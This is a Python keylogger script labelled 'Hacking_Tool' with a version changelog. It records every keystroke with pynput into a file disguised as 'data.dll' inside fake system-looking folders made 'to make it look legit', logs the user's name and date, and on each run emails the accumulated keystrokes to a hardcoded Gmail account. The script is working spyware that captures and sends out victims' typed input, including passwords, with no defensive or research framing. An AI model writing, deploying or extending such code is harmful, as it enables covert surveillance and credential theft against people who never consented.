

# Hacking_Tool       ver 6.1.0



# ----------------------------------------------------------
# WHAT'S NEW:(ver 6.1.0)
# Now it keeps a previous record and sends all of it
# TODO : add a feature to delete previous data when size becomes big
# ----------------------------------------------------------

# ----------------------------------------------------------
# WHAT'S NEW:(ver 6.0.0)
# Removed the error when internet connection is not available
# It has been removed in two steps
# ----------------------------------------------------------




# ----------------------------------------------------------
# WHAT'S NEW:(ver 5.0.0)
# ~Added server support to control this app remotely
# ~Added some more bugs: APP CRASHES WHEN INTERNET CONNECTION..
#  ..IS NOT AVAILABLE
# ----------------------------------------------------------



# ----------------------------------------------------------
# WHAT'S NEW:(ver 4.2.1)
# ~Fixed the previous LOG file layout bug.
# ----------------------------------------------------------



# ----------------------------------------------------------
# WHAT'S NEW:(ver 4.2.0)
#  ~Created more files under PROGRAM LOGS to make it look
#   legit.
#  ~Fixed some minor bugs
#  ~Added some minor bugs to fix later
# ----------------------------------------------------------




# ----------------------------------------------------------
# WHAT'S NEW:(ver 4.1.0)
#  ~Now this application will also log the user's name along with the date and time
#  ~Fixed some minor bugs
# ----------------------------------------------------------









# It records key strokes and sends the recorded strokes via email

"""          ~by: Ayush Singh
                        @officialPirate (Twitter)
                        @_neural.network_ (Instagram)     """


from os import makedirs, chdir
from os.path import exists
from smtplib import SMTP
from datetime import datetime as dt
from getpass import getuser
from pynput.keyboard import Listener

try:

    if not exists("C:\\Program Logs\\filesystem"):    # Checks for any previous records
        chdir("C:\\")
        makedirs('Program Logs')
        chdir('Program Logs')
        makedirs("failsafe")
        makedirs("Intel")
        makedirs("filesystem")
        chdir('filesystem')
        makedirs('chipset')
        chdir('chipset')
        makedirs('services')
        makedirs('LOGS')
        chdir('LOGS')
        f9 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'w')

    if exists("C:\\Program Logs\\filesystem"):
        f2 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'r')#Reads the previous stored content to send it via email
        msg = f2.read()
        f2.close()

        try:
          
          
            my_email = 'someone@example.com'
            my_password = 'MyPassword'
            mail = SMTP('smtp.gmail.com', 587)


            mail.ehlo()

            mail.starttls()

            mail.login(my_email, my_password)

            mail.sendmail(my_email, my_email, msg)  # Sends an email to itself
        except:
            print('No internet connection')

        f5 = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'a')  # APPENDS TO  the previous stored content
        now = dt.now()
        username = getuser()
        f5.write('\n\n\n\n\n\n\n\n'+  str(now.date()) + '\n \n \n '+str(username)+'\n\n\n\n')  # This line was last modified
        f5.close()


    def on_press(key):
        f = open('C:\\Program Logs\\filesystem\\chipset\\LOGS\\data.dll', 'a')

        f.write(str(key) + '\n')
        f.close()


    def on_release(key):
        pass


    # f = open('C:\\filesystem\\LOGS\\logs3.txt', 'a')
    # f.write(str(key)+'\n')
    # f.close()

    #   if key==Key.esc:
    #       return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


except:

    print('NO INTERNET CONNECTION')
